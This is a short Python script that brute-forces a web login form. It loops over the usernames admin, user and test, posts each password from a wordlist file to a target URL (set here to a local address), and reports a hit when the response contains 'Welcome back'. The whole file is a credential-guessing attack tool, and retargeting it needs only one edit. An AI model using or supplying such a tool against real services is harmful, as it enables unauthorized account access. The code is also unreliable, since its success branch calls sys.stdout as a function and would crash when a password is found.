#!/usr/bin/env python3
#Author: Bill Burn

import click
click.clear()

import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "passwords.txt"
needle = "Welcome back" # This is the text provided on succesful login

for username in usernames:
    with open(passwords, 'r') as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush() # flushes the buffer after each write
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout("\n")
                sys.stdout("\t[>>] Valid password '{}' found for user '{}'".format(password.decode(), username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo password found for '{}'".format(username))
        